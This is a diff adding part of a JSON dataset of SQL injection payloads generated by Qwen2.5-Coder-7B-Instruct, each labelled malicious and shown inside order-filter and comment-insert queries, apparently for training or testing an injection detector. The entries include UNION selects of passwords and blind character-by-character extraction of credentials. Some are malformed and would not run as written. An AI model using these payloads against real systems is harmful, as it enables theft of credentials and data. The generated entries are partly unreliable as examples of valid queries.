+    "full_query": "SELECT * FROM users WHERE id = UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_name LIKE 'users'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND (SELECT COUNT(*) FROM users AS t1 JOIN transactions AS t2 ON t1.id = t2.user_id)--",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND (SELECT COUNT(*) FROM users AS t1 JOIN transactions AS t2 ON t1.id = t2.user_id)--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' OR (SELECT SUBSTRING(CAST(ASCII(SUBSTRING(password, 1, 1)) AS VARCHAR), 1, 1) LIKE '%a%'--",
+    "full_query": "SELECT * FROM orders WHERE status = '1' OR (SELECT SUBSTRING(CAST(ASCII(SUBSTRING(password, 1, 1)) AS VARCHAR), 1, 1) LIKE '%a%'--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND LENGTH((SELECT username FROM admins WHERE id = 1)) > 0 --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND LENGTH((SELECT username FROM admins WHERE id = 1)) > 0 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND (SELECT DATABASE()) IN ('information_schema', 'mysql') --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND (SELECT DATABASE()) IN ('information_schema', 'mysql') --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' UNION SELECT 1, user(), password FROM users --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' UNION SELECT 1, user(), password FROM users --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 1, 0) FROM users LIMIT 1) --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 1, 0) FROM users LIMIT 1) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users LIMIT 1) > 0 --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users LIMIT 1) > 0 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND (SELECT COUNT(*) FROM users WHERE status='pending') != 0 --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND (SELECT COUNT(*) FROM users WHERE status='pending') != 0 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND 1=1 AND (SELECT 1 FROM (SELECT 1 FROM users UNION ALL SELECT 1 FROM orders)) --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND 1=1 AND (SELECT 1 FROM (SELECT 1 FROM users UNION ALL SELECT 1 FROM orders)) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' OR EXISTS(SELECT 1 FROM (SELECT * FROM orders WHERE status LIKE '%pending%' UNION SELECT * FROM users WHERE username LIKE '%admin%'))#",
+    "full_query": "SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM (SELECT * FROM orders WHERE status LIKE '%pending%' UNION SELECT * FROM users WHERE username LIKE '%admin%'))#' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "order_filter",
+    "payload": "1' AND (SELECT 1 FROM (SELECT * FROM orders WHERE order_id IN ((SELECT MAX(order_id) FROM orders)))) --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' AND (SELECT 1 FROM (SELECT * FROM orders WHERE order_id IN ((SELECT MAX(order_id) FROM orders)))) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR 1=1)) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR 1=1)) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%admin%')) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%admin%')) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "(CASE WHEN (SELECT 1 FROM (SELECT * FROM config WHERE debug_mode = 'on')) THEN 1 ELSE 0 END) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM config WHERE debug_mode = 'on')) THEN 1 ELSE 0 END) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "' OR (SELECT 1 FROM (SELECT * FROM logs WHERE error_code != ''))--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM (SELECT * FROM logs WHERE error_code != ''))--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "--' UNION SELECT user_id, body FROM comments WHERE user_id = (SELECT user_id FROM users WHERE username LIKE '%admin%')--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--' UNION SELECT user_id, body FROM comments WHERE user_id = (SELECT user_id FROM users WHERE username LIKE '%admin%')--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "' OR (SELECT 1 FROM (SELECT * FROM domains WHERE domain_name LIKE '%test%' AND (SELECT COUNT(*) FROM users WHERE active = 1)))--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM (SELECT * FROM domains WHERE domain_name LIKE '%test%' AND (SELECT COUNT(*) FROM users WHERE active = 1)))--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "(CASE WHEN (SELECT 1 FROM (SELECT * FROM tables WHERE table_schema = 'public' AND column_name LIKE '%password%')) THEN 1 ELSE 0 END)--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM tables WHERE table_schema = 'public' AND column_name LIKE '%password%')) THEN 1 ELSE 0 END)--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "/*' OR EXISTS(SELECT 1 FROM (SELECT * FROM columns WHERE data_type = 'varchar' AND table_schema = 'private'))*/--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '/*' OR EXISTS(SELECT 1 FROM (SELECT * FROM columns WHERE data_type = 'varchar' AND table_schema = 'private'))*/--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "' AND 1=1 UNION ALL SELECT schema_name, sequence_name FROM information_schema.sequences WHERE schema_name='test' /*",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 UNION ALL SELECT schema_name, sequence_name FROM information_schema.sequences WHERE schema_name='test' /*')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR (SELECT 1 FROM (SELECT * FROM roles WHERE role_name LIKE '%admin%')))) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR (SELECT 1 FROM (SELECT * FROM roles WHERE role_name LIKE '%admin%')))) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%delete%' AND (SELECT COUNT(*) FROM permissions WHERE permission_level <= 0))) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%delete%' AND (SELECT COUNT(*) FROM permissions WHERE permission_level <= 0))) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "comment_insert",
+    "payload": "(CASE WHEN (SELECT 1 FROM (SELECT * FROM settings WHERE theme_name LIKE '%dark%' AND (SELECT COUNT(*) FROM events WHERE event_type LIKE '%login%' AND user_agent LIKE '%Chrome%'))) THEN 1 ELSE 0 END) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM settings WHERE theme_name LIKE '%dark%' AND (SELECT COUNT(*) FROM events WHERE event_type LIKE '%login%' AND user_agent LIKE '%Chrome%'))) THEN 1 ELSE 0 END) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  }
+]
